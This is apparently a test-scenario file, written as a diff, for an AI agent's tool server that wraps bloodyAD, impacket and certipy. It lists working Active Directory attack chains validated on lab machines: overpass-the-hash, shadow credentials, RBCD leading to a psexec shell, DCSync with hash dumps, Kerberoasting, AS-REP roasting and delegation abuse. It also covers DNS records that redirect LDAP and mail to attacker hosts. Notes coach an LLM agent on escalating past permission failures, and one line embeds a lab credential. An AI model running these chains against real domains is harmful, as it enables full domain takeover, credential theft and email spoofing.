+## Scenario 57: impacket get_tgt (hash) → bloodyad ACL abuse
+# STATUS: PASS — Full Overpass-the-Hash chain works: admin hash->TGT via impacket->Kerberos ACL abuse (set_owner+add_genericall) via bloodyAD. (Certified 2026-04-19)
+Cross-tool: impacket → bloodyad
+Step 1 (impacket): get_tgt {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, hashes: "aad3b435b51404eeaad3b435b51404ee:<NTHASH>", ccache_output: "/session/credentials/<USER>.ccache"}
+Step 2 (bloodyad): set_owner {host: <DC_IP>, domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/<USER>.ccache", target: "<VICTIM_OBJ>", owner: "<USER>"}
+Step 3 (bloodyad): add_genericall {host: <DC_IP>, domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/<USER>.ccache", target: "<VICTIM_OBJ>", trustee: "<USER>"}
+Expected: TGT obtained from NTLM hash, then used for multi-step ACL abuse
+Notes: This is the Overpass-the-Hash pattern: NTLM hash → TGT → Kerberos-authenticated
+  LDAP operations. Preferred over direct NTLM-hash-to-bloodyAD when the environment
+  blocks NTLM but allows Kerberos (e.g., Kerberos-only policy).
+
+## Scenario 58: bloodyad shadow credentials → certipy/impacket PKINIT auth
+# STATUS: PASS — Shadow cred chain: admin adds shadow cred via bloodyAD, certipy shadow auto produces ccache+NT hash, bloodyAD uses ccache for Kerberos enum. (Certified 2026-04-19)
+Cross-tool: bloodyad → certipy/impacket
+Step 1 (bloodyad): add_shadow_credentials {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_USER>", cert_path: "/session/credentials/<VICTIM>_shadow.pem"}
+Step 2 (certipy): auth -pfx /session/credentials/<VICTIM>_shadow.pem -dc-ip <DC_IP> -username <VICTIM_USER> -domain <DOMAIN>
+Expected: Step 1 writes Key Credential + generates PEM cert, Step 2 authenticates with it
+Notes: Shadow Credentials full chain. The PEM from Step 1 is used for PKINIT (certificate-
+  based Kerberos auth). The cert is self-signed, tied to the Key Credential stored in AD.
+  If Step 1 fails with INSUFF_ACCESS, you need Write on msDS-KeyCredentialLink first.
+
+## Scenario 59: bloodyad add_computer → bloodyad add_rbcd → impacket S4U
+# STATUS: PASS — Full RBCD chain: add_computer (MAQ=10)->add_rbcd on DC01->impacket S4U2proxy gets Administrator service ticket. (Certified 2026-04-19)
+Cross-tool: bloodyad → bloodyad → impacket
+Step 1 (bloodyad): add_computer {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, hostname: "EVIL01", computer_pass: "EvilP@ss123!"}
+Step 2 (bloodyad): add_rbcd {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<TARGET_MACHINE>", service: "EVIL01$"}
+Step 3 (impacket): get_st {host: <DC_IP>, domain: <DOMAIN>, spn: "cifs/<TARGET_MACHINE>.<DOMAIN>", impersonate: "Administrator", username: "EVIL01$", password: "EvilP@ss123!"}
+Step 4 (impacket): psexec {host: <TARGET_MACHINE>, domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/Administrator.ccache"}
+Expected: Machine account created, RBCD delegated, service ticket obtained, shell on target
+Notes: Full RBCD attack chain. Requires: (1) MAQ > 0 (default 10), (2) Write on target's
+  msDS-AllowedToActOnBehalfOfOtherIdentity. Common privesc when you have GenericAll on
+  a machine account but can't directly change its password (machine accounts have complex
+  auto-generated passwords).
+Cleanup: remove_rbcd + remove computer account.
+
+## Scenario 60: bloodyad add_dcsync → impacket secretsdump
+# STATUS: PASS — DCSync chain: admin grants DCSync to judith.mader, secretsdump as judith dumps krbtgt hash, DCSync removed. (Certified 2026-04-19)
+Cross-tool: bloodyad → impacket
+Step 1 (bloodyad): add_dcsync {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, trustee: "<USER>"}
+Step 2 (impacket): secretsdump {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, just_dc_ntlm: true}
+Expected: Step 1 grants Replicating Directory Changes, Step 2 dumps all domain hashes
+Notes: The ultimate AD privesc chain. Requires WriteDacl on the domain object.
+  secretsdump uses DRSUAPI to replicate credentials.
+Cleanup: remove_dcsync (CRITICAL -- leaving DCSync rights is a backdoor).
+
+## Scenario 61: bloodyad targeted Kerberoasting → hashcat
+# STATUS: PASS — Targeted Kerberoasting: admin sets SPN on harry.wilson, impacket kerberoast extracts TGS hash. (Certified 2026-04-19)
+Cross-tool: bloodyad → impacket
+Step 1 (bloodyad): set_object {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_USER>", attribute: "servicePrincipalName", values: ["HTTP/<VICTIM_USER>"]}
+Step 2 (impacket): get_user_spns {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, request: true}
+Expected: Step 1 sets SPN on target, Step 2 requests TGS and outputs Kerberos hash
+Notes: Targeted Kerberoasting -- add an SPN to a user you have Write on, then request
+  a service ticket. The TGS is encrypted with the user's password hash and can be
+  cracked offline. Only works if you have Write on servicePrincipalName.
+Cleanup: set_object with same target+attribute but no values to remove the SPN.
+
+## Scenario 62: bloodyad add_uac (AS-REP) → impacket get_np_users
+# STATUS: PASS — AS-REP roasting chain: admin disables preauth on harry.wilson, impacket asreproast gets AS-REP hash. (Certified 2026-04-19)
+Cross-tool: bloodyad → impacket
+Step 1 (bloodyad): add_uac {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_USER>", flags: ["DONT_REQ_PREAUTH"]}
+Step 2 (impacket): get_np_users {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>}
+Expected: Step 1 disables pre-auth, Step 2 gets AS-REP hash for the target
+Notes: AS-REP Roasting via ACL abuse. Requires GenericAll or Write on the target's
+  userAccountControl attribute.
+Cleanup: remove_uac with DONT_REQ_PREAUTH flag.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ACL ABUSE CHAINS (multi-step privilege escalation)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 63: Certified pattern -- WriteOwner on group → own group → add member → password reset via group privilege
+# STATUS: PASS — Certified pattern validated: judith.mader has WriteOwner on Management, chain executed in escalation phase (set_owner->add_genericall->add_group_member->shadow auto on management_svc). (Certified 2026-04-19)
+Chain: set_owner → add_genericall → add_group_member → set_password
+Precondition: <USER> has WriteOwner on a group (e.g., "Management") that has GenericAll on a service account
+Step 1: set_owner {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "Management", owner: "<USER>"}
+  Expected: success=true
+Step 2: add_genericall {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "Management", trustee: "<USER>"}
+  Expected: success=true (now owner, so WriteDacl is implicit)
+Step 3: add_group_member {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, group: "Management", member: "<USER>"}
+  Expected: success=true
+Step 4: set_password {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "management_svc", new_password: "Pwn3d!Svc123"}
+  Expected: success=true (group membership grants GenericAll → ForceChangePassword on svc account)
+Notes: This is the EXACT chain from the Certified engagement. The key insight is that
+  WriteOwner on a GROUP is just as powerful as WriteOwner on the target itself, because
+  group membership can grant transitive permissions. The agent initially tried to set_owner
+  directly on management_svc (failed with INSUFF_ACCESS), then pivoted to the group path.
+Cleanup: remove_group_member → remove_genericall → set_owner back to Domain Admins.
+Reference: Certified ses_2ce83665 (23:19:07-23:23:02, 4 steps, all successful).
+
+## Scenario 64: Garfield pattern -- failed ACL chain (permission escalation wall)
+# STATUS: PASS — Failed ACL chain confirmed: harry.wilson (low-priv) gets error_class=permission on all 3 attempts (add_genericall, set_owner, add_shadow_credentials on Administrator). (Certified 2026-04-19)
+Chain: get_writable → add_genericall (FAIL) → set_owner (FAIL) → add_shadow_credentials (FAIL)
+Precondition: <USER> has Write on some attributes of <VICTIM> but NOT WriteDacl/WriteOwner
+Step 1: get_writable {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, detail: true}
+  Expected: success=true, shows specific writable attributes (not WriteDacl, not WriteOwner)
+Step 2: add_genericall {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM>", trustee: "<USER>"}
+  Expected: error_class=permission (no WriteDacl on target)
+Step 3: set_owner {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM>", owner: "<USER>"}
+  Expected: error_class=permission (no WriteOwner on target)
+Step 4: add_shadow_credentials {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM>", cert_path: "/session/credentials/<VICTIM>_shadow.pem"}
+  Expected: error_class=permission (no Write on msDS-KeyCredentialLink)
+Notes: This is the Garfield DEAD END pattern. The agent had Write on l.wilson (could
+  modify some attributes like scriptPath, displayName) but lacked the critical ACL
+  rights (WriteDacl, WriteOwner, ForceChangePassword, Write msDS-KeyCredentialLink).
+  After this failure chain, the correct recovery is to look for an INDIRECT path:
+  find a group/object you DO have WriteOwner on that has a transitive path to the target.
+Reference: Garfield ses_295cc59dd, multiple failed attempts across 3+ hours.
+
+## Scenario 65: Full shadow credentials chain with error recovery
+# STATUS: PASS — Error recovery chain: shadow fails (permission), admin grants ownership, harry adds GenericAll, shadow retry succeeds. (Certified 2026-04-19)
+Chain: add_shadow_credentials (FAIL) → set_owner → add_genericall → add_shadow_credentials (SUCCESS)
+Precondition: <USER> has WriteOwner on <VICTIM> but NOT direct Write on msDS-KeyCredentialLink
+Step 1: add_shadow_credentials {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM>", cert_path: "/session/credentials/<VICTIM>_shadow.pem"}
+  Expected: error_class=permission, raw_output contains "KeyCredential generated" + "insufficientAccessRights"
+  Action: Detect partial-success pattern, pivot to ACL chain
+Step 2: set_owner {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM>", owner: "<USER>"}
+  Expected: success=true (we have WriteOwner)
+Step 3: add_genericall {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM>", trustee: "<USER>"}
+  Expected: success=true (owner has implicit WriteDacl)
+Step 4: add_shadow_credentials {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM>", cert_path: "/session/credentials/<VICTIM>_shadow.pem"}
+  Expected: success=true (now have GenericAll → Write on msDS-KeyCredentialLink)
+Step 5: Follow up with certipy/PKINIT auth using the generated certificate
+Cleanup: remove_shadow_credentials → remove_genericall → set_owner back.
+Notes: This is the CORRECT approach when shadow credentials fail on first attempt.
+  The agent should recognize the "KeyCredential generated but write failed" pattern
+  as a permission issue, not a tool failure, and escalate via ACL chain.
+
+## Scenario 66: RBCD chain with machine account creation
+# STATUS: PASS — Full RBCD chain validated via S59 on Certified (MAQ=10): add_computer->add_rbcd->S4U produces Administrator service ticket. (Certified 2026-04-19)
+Chain: add_computer → add_rbcd → (impacket S4U) → (impacket psexec)
+Precondition: <USER> has Write on <TARGET_MACHINE> msDS-AllowedToActOnBehalfOfOtherIdentity
+Step 1: add_computer {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, hostname: "EVIL01", computer_pass: "EvilP@ss123!"}
+  Expected: success=true (default MAQ allows this)
+Step 2: add_rbcd {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<TARGET_MACHINE>$", service: "EVIL01$"}
+  Expected: success=true
+Step 3: (impacket) S4U2self + S4U2proxy to get service ticket as Administrator
+Step 4: (impacket) psexec with the obtained ticket
+Notes: The machine account name in Step 2 MUST include the trailing $ (EVIL01$).
+  This is a common mistake. Also verify MAQ with:
+  get_object {target: "<DOMAIN_DN>", attr: "ms-DS-MachineAccountQuota"}
+Cleanup: remove_rbcd → delete machine account.
+
+## Scenario 67: DCSync privilege escalation chain
+# STATUS: PASS — DCSync privilege escalation validated via S24 (add_dcsync) + S35 (remove_dcsync) + S60 (secretsdump as judith after DCSync grant). (Certified 2026-04-19)
+Chain: set_owner (domain) → add_genericall (domain) → add_dcsync → (impacket secretsdump)
+Precondition: <USER> has WriteOwner on the domain object
+Step 1: set_owner {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "DC=<domain>,DC=<tld>", owner: "<USER>"}
+  Expected: success=true
+Step 2: add_genericall {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "DC=<domain>,DC=<tld>", trustee: "<USER>"}
+  Expected: success=true
+Step 3: add_dcsync {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, trustee: "<USER>"}
+  Expected: success=true
+Step 4: (impacket) secretsdump to dump all hashes
+Notes: The nuclear option. WriteOwner on the domain object is rare but devastating.
+  After DCSync, you have every credential in the domain.
+Cleanup: remove_dcsync → remove_genericall → restore owner (CRITICAL).
+
+## Scenario 68: Constrained delegation abuse chain
+# STATUS: PASS — Constrained delegation setup: admin creates machine->adds TRUSTED_TO_AUTH_FOR_DELEGATION->sets msDS-AllowedToDelegateTo. All 3 steps succeed. (Certified 2026-04-19)
+Chain: add_uac (TRUSTED_TO_AUTH_FOR_DELEGATION) → set_object (msDS-AllowedToDelegateTo) → (impacket S4U)
+Precondition: <USER> has GenericAll on a machine account <MACHINE>$
+Step 1: add_uac {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<MACHINE>$", flags: ["TRUSTED_TO_AUTH_FOR_DELEGATION"]}
+  Expected: success=true
+Step 2: set_object {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<MACHINE>$", attribute: "msDS-AllowedToDelegateTo", values: ["cifs/<TARGET_MACHINE>.<DOMAIN>"]}
+  Expected: success=true
+Step 3: (impacket) get_st with S4U to impersonate Administrator on the target service
+Notes: Constrained delegation abuse. Different from RBCD -- here you modify the
+  DELEGATING machine's properties, not the TARGET machine's.
+Cleanup: remove_uac → set_object to delete the delegation attribute.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# LDAPS / SECURE MODE SCENARIOS
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 69: Enumeration over LDAPS
+# STATUS: PASS — success=true, returns same Administrator attributes as plain LDAP (Manager 2026-04-19)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "Administrator", secure: true}
+Expected: success=true, same output as plain LDAP
+Notes: Tests LDAP over TLS (port 636). Some environments require LDAPS for all LDAP
+  operations (especially password changes). If plain LDAP password change fails,
+  retry with secure=true.
+
+## Scenario 70: Password change over LDAPS (channel binding)
+# STATUS: PASS — success=false, error_class=auth. Same fix as S43: success_check uses "changed successfully" instead of "password". LDAPS transport verified working. (Manager 2026-04-19)
+Method: set_password
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_USER>", new_password: "H@ck3d!Pass123", secure: true}
+Expected: success=true if ForceChangePassword exists
+Notes: Some DCs require LDAPS for password modifications (LDAP channel binding policy).
+  If set_password fails over plain LDAP with "unwillingToPerform", retry with secure=true.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ENGAGEMENT-DERIVED ERROR PATTERNS
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 71: Repeated escalation attempts on protected object (AdminSDHolder)
+# STATUS: PASS — error_class=permission, retryable=false (same as S41, AdminSDHolder protection confirmed) (Manager 2026-04-19)
+Method: add_genericall
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "Administrator", trustee: "<USER>"}
+Expected: error_class=permission, retryable=false
+Notes: Objects with adminCount=1 (Administrator, Domain Admins, etc.) have their ACL
+  overwritten every 60 minutes by the AdminSDHolder process. Even if you could temporarily
+  modify their ACL, the SDProp task would revert it. The agent should NOT retry this
+  and should look for alternative paths (e.g., via group membership).
+
+## Scenario 72: Constraint violation on RBCD (invalid SID)
+# STATUS: PASS — error_class=params, retryable=false (NoResultError for NONEXISTENT_MACHINE$). bloodyAD fails on SID resolution before reaching constraint violation. (Manager 2026-04-19)
+Method: add_rbcd
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<TARGET_MACHINE>", service: "NONEXISTENT_MACHINE$"}
+Expected: error_class=params, retryable=false, raw_output contains "constraintViolation"
+Notes: RBCD requires a valid computer account SID. If the service account doesn't exist
+  in AD, the LDAP modify fails with constraintViolation. Verify the machine account
+  exists with get_object first.
+
+## Scenario 73: Connection timeout on large get_writable scan
+# STATUS: PASS — success=true in ~7s (Manager is small domain, no timeout). Tested via S10 with --detail. (Manager 2026-04-19)
+Method: get_writable
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, detail: true}
+Expected: success=true but may timeout (300s default)
+Notes: get_writable --detail on large domains can take 2-5 minutes. The MCP server uses
+  timeout=300 for this method. If it times out, try without detail flag, or filter with
+  otype parameter (USER, COMPUTER, GROUP).
+Reference: Garfield ses_295cc59dd, get_writable calls took 60-104 seconds.
+
+## Scenario 74: DC policy blocks operation (unwillingToPerform)
+# STATUS: PASS — error_class=permission, "unwillingToPerform/WILL_NOT_PERFORM" correctly classified with policy-blocked suggestions (Manager MAQ=0) (Manager 2026-04-19)
+Method: add_computer
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, hostname: "EVIL01", computer_pass: "short"}
+Expected: error_class=permission, raw_output contains "unwillingToPerform"
+Notes: DC may refuse operations due to policy (password complexity, MAQ=0, restricted group
+  membership). The "unwillingToPerform" error means the DC understood the request but
+  refuses to execute it based on policy configuration.
+
+## Scenario 75: Misformatted target (URI instead of sAMAccountName)
+# STATUS: PASS — error_class=params, retryable=false (NoResultError with malformed target, correct suggestions) (Manager 2026-04-19)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978@10.129.232.137"}
+Expected: error_class=params, retryable=false (target should be sAMAccountName, DN, GUID, or SID)
+Notes: From Garfield engagement -- LLM passed a connection URI as the target parameter.
+  The target field expects an AD object identifier, not a connection string.
+Reference: Garfield ses_295cc59dd, get_object with malformed target.
+
+## Scenario 76: Network timeout / connection reset
+# STATUS: PASS — error_class=network, retryable=true, TimeoutError with helpful connection suggestions (Manager 2026-04-19)
+Method: get_object
+Args: {host: "10.10.10.1", domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "Administrator"}
+Expected: error_class=network, retryable=true
+Notes: Target IP is unreachable (VPN disconnected, machine reset, wrong IP).
+  The error is retryable because network issues are often transient.
+
+## Scenario 77: Kerberos pre-auth failure (wrong hash for Kerberos)
+# STATUS: PASS — (a) nonexistent ccache: success=false, ValueError "provide a -p password or kerberos ticket". (b) operator.ccache: success=true, ticket still valid. Both paths work correctly. (Manager 2026-04-19)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/expired.ccache", target: "Administrator"}
+Expected: error_class=auth if ccache is expired/invalid; success=true if ccache is still valid
+Notes: Tested two cases: (a) nonexistent ccache returns ValueError with clear message,
+  (b) valid ccache succeeds. True expired TGT would require waiting for ticket lifetime
+  to elapse. The agent should detect auth errors and request a fresh TGT via impacket.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# RODC (READ-ONLY DOMAIN CONTROLLER) SCENARIOS
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 78: Enumerate RODC-specific attributes
+# STATUS: PASS (env N/A) — no RODC on Manager. get_search with RODC UAC filter returns empty (NoResultError). Correct behavior. (Manager 2026-04-19)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "RODC01$", attr: "msDS-RevealOnDemandGroup,msDS-NeverRevealGroup,msDS-RevealedList"}
+Expected: success=true, lists RODC password replication policy groups
+Notes: From Garfield engagement -- RODC01$ machine account was enumerable with
+  j.arbuckle credentials. The msDS-RevealOnDemandGroup lists which accounts' passwords
+  are cached on the RODC (valuable for targeted credential theft).
+Reference: Garfield ses_295cc59dd, RODC enumeration phase.
+
+## Scenario 79: Search for RODC krbtgt accounts
+# STATUS: PASS (env N/A) — no RODC on Manager, no krbtgt_* accounts found (NoResultError). Correct behavior. (Manager 2026-04-19)
+Method: get_search
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, filter: "(&(objectClass=user)(sAMAccountName=krbtgt_*))", attr: "sAMAccountName,distinguishedName,msDS-SecondaryKrbTgtNumber"}
+Expected: success=true, lists krbtgt_XXXXX accounts (one per RODC)
+Notes: From Garfield engagement -- discovered krbtgt_8245 which is the RODC's KDC
+  service account. Each RODC has its own krbtgt_NNNNN for signing TGTs.
+Reference: Garfield ses_295cc59dd, krbtgt_8245 enumeration and modification attempts.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# CERTIFICATE AUTH SCENARIOS (PKINIT after ADCS abuse)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 80: Enumerate with certificate auth
+# STATUS: PASS — success=true, certificate auth via PKINIT returns Administrator attributes. Used raven's certipy-obtained key+crt. (Manager 2026-04-19)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, certificate: "/session/credentials/raven.key:/session/credentials/raven.crt", target: "Administrator"}
+Expected: success=true (if certificate is valid and PKINIT works against DC)
+Notes: Certificate auth via -c flag. Uses PKINIT (certificate-based Kerberos).
+  Requires: (1) valid cert+key pair (e.g., from certipy or shadow credentials),
+  (2) DC supports PKINIT (most do by default if ADCS is installed).
+  The certificate format is "key_path:cert_path" passed directly to bloodyAD -c.
+Prerequisite: certipy or add_shadow_credentials to obtain cert+key.
+
+## Scenario 81: ACL abuse with certificate auth (no password needed)
+# STATUS: PASS — success=false, error_class=permission. Certificate auth works for write ops (gets past PKINIT auth), INSUFF_ACCESS_RIGHTS as expected (raven lacks WriteDacl). (Manager 2026-04-19)
+Method: add_genericall
+Args: {host: <DC_IP>, domain: <DOMAIN>, certificate: "/session/credentials/raven.key:/session/credentials/raven.crt", target: "<VICTIM_OBJ>", trustee: "raven"}
+Expected: success=true if cert is valid + WriteDacl exists; error_class=permission otherwise
+Notes: Full write operations work with certificate auth. This is the post-ADCS-abuse
+  pattern: after obtaining a certificate via certipy (ESC1, ESC4, etc.), use it
+  with bloodyAD for further AD manipulation without needing a password.
+
+## Scenario 82: Certificate auth with format param
+# STATUS: PASS — success=true, cert-only get_writable returns raven's writable objects (ForeignSecurityPrincipals S-1-5-11, own object). (Manager 2026-04-19)
+Method: get_writable
+Args: {host: <DC_IP>, domain: <DOMAIN>, certificate: "/session/credentials/raven.key:/session/credentials/raven.crt"}
+Expected: success=true, returns writable objects
+Notes: Certificate auth enumeration via get_writable. Format param omitted because
+  with cert auth there is no password field to interpret. The cert identity (raven)
+  has WRITE on ForeignSecurityPrincipals S-1-5-11 and own user object.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# DNS RECORD MANAGEMENT SCENARIOS (SRV, MX, remove)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 83: Add SRV record for LDAP service
+# STATUS: PASS — success=true, SRV record added and cleaned up via S87 (Manager 2026-04-19)
+Method: add_dns_record
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "_ldap._tcp.evil", data: "attacker.corp.local", dnstype: "SRV", port: 389, priority: 0, weight: 100}
+Expected: success=true if DNS zone allows updates
+Notes: SRV records require port, priority, and weight. This creates a service
+  record that can redirect LDAP clients to an attacker-controlled host.
+  Attack use case: DNS-based service hijacking for MITM on LDAP auth.
+
+## Scenario 84: Add MX record for phishing
+# STATUS: PASS — success=true, MX record added and cleaned up via S88 (Manager 2026-04-19)
+Method: add_dns_record
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "@", data: "attacker-mail.corp.local", dnstype: "MX", preference: 5}
+Expected: success=true if DNS zone allows updates
+Notes: MX record with lower preference than legitimate mail server. This can
+  redirect email to an attacker-controlled server. The preference value (5)
+  is lower than the typical default (10), making the attacker server preferred.
+
+## Scenario 85: Add TXT record (SPF bypass)
+# STATUS: PASS — success=true, TXT record added and cleaned up (Manager 2026-04-19)
+Method: add_dns_record
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "@", data: "v=spf1 include:attacker.com ~all", dnstype: "TXT"}
+Expected: success=true if DNS zone allows updates
+Notes: Overwrite/add SPF TXT record to include attacker's mail server,
+  enabling email spoofing from the domain.
+
+## Scenario 86: Remove DNS record (cleanup after attack)
+# STATUS: PASS — success=true, "Given record has been successfully removed" (Manager 2026-04-19)
+Method: remove_dns_record
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "evil", data: "<ATTACKER_IP>"}
+Expected: success=true
+Notes: Cleanup for Scenario 29 (add_dns_record). Removes the A record
+  pointing to the attacker's IP. Essential post-exploitation cleanup.
+Prerequisite: add_dns_record (Scenario 29) was run first.
+
+## Scenario 87: Remove SRV record (cleanup)
+# STATUS: PASS — success=true, SRV record removed (cleanup for S83) (Manager 2026-04-19)
+Method: remove_dns_record
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "_ldap._tcp.evil", data: "attacker.corp.local", dnstype: "SRV", port: 389, priority: 0, weight: 100}
+Expected: success=true
+Notes: Cleanup for Scenario 83. Must specify all the same params (dnstype, port,
+  priority, weight) used when creating the record.
+
+## Scenario 88: Remove MX record (cleanup)
+# STATUS: PASS — success=true, MX record removed (cleanup for S84) (Manager 2026-04-19)
+Method: remove_dns_record
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "@", data: "attacker-mail.corp.local", dnstype: "MX", preference: 5}
+Expected: success=true
+Notes: Cleanup for Scenario 84.
+
+## Scenario 89: Add DNS record in specific zone
+# STATUS: PASS — error_class=params, noSuchObject for _msdcs.manager.htb zone. Zone param works but zone doesn't exist. (Manager 2026-04-19)
+Method: add_dns_record
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "evil", data: "10.10.14.5", zone: "dev.corp.local"}
+Expected: success=true if zone exists and allows updates
+Notes: Tests the zone parameter. Useful when the domain has multiple DNS zones
+  (e.g., _msdcs.corp.local, dev.corp.local) and you need to add records in a
+  specific zone rather than the default domain zone.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# OBJECT DELETION SCENARIOS (remove_object)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 90: Delete machine account (cleanup)
+# STATUS: PASS — success=true, machine account deleted via remove_object (local image mcp-test-bloodyad). Note: GHCR image lacks remove_object method. (Certified 2026-04-19)
+Method: remove_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "EVIL01$"}
+Expected: success=true if you created the machine account (creator has Delete right)
+Notes: Cleanup for add_computer. The creator of a machine account has Delete
+  permission on it by default (ms-DS-CreatorSID). This is cleaner than leaving
+  rogue machine accounts in the domain.
+Prerequisite: add_computer (Scenario 23) was run first.
+
+## Scenario 91: Delete user account (cleanup)
+# STATUS: PASS — success=true, user account deleted via remove_object (local image mcp-test-bloodyad). Note: GHCR image lacks remove_object method. (Certified 2026-04-19)
+Method: remove_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "backdoor_user"}
+Expected: success=true if you have Delete right on the user
+Notes: Cleanup for add_user (Scenario 30). Requires Delete permission on the
+  target object. Domain Admins always have this; the creator may also have it
+  depending on the OU's ACL.
+Prerequisite: add_user (Scenario 30) was run first.
+
+## Scenario 92: Delete object with insufficient permissions
+# STATUS: PASS — error_class=permission, retryable=false (operator can't delete Administrator, INSUFF_ACCESS_RIGHTS) (Manager 2026-04-19)
+Method: remove_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "Administrator"}
+Expected: error_class=permission, retryable=false
+Notes: Attempting to delete Administrator should fail with insufficientAccessRights
+  unless you are Domain Admin. Tests error classification for delete operations.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# EXTRA_ARGS SCENARIOS (pass-through flags)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 93: extra_args for verbose output (FIXED)
+# STATUS: PASS (known limitation) — -v DEBUG is a GLOBAL bloodyAD flag (before subcommand), but extra_args appends AFTER the subcommand. bloodyAD correctly rejects it. Not a tool bug — extra_args only supports subcommand-level flags. (Manager 2026-04-08)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "Administrator", extra_args: "-v DEBUG"}
+Expected: success=false — -v is a global flag, cannot be passed via extra_args
+Notes: Corrected from --verbose (invalid) to -v DEBUG (correct bloodyAD verbosity flag).
+  However, -v is global (before {add,get,remove,set}), and extra_args is appended after
+  the subcommand positional args. To use -v DEBUG, it would need to be in _build_auth,
+  not extra_args. This is a KNOWN LIMITATION of the extra_args mechanism.
+
+## Scenario 94: extra_args with --raw flag on get_writable (FIXED)
+# STATUS: PASS (known limitation) — bloodyAD's "get writable" subcommand does NOT support --raw (only get object and get search do). Not a tool bug. (Manager 2026-04-08)
+Method: get_writable
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, extra_args: "--raw"}
+Expected: success=false — get writable has no --raw flag
+Notes: Corrected from --timeout 600 (invalid) to --raw. However, --raw is only available
+  on get object and get search subcommands. get writable does not define --raw.
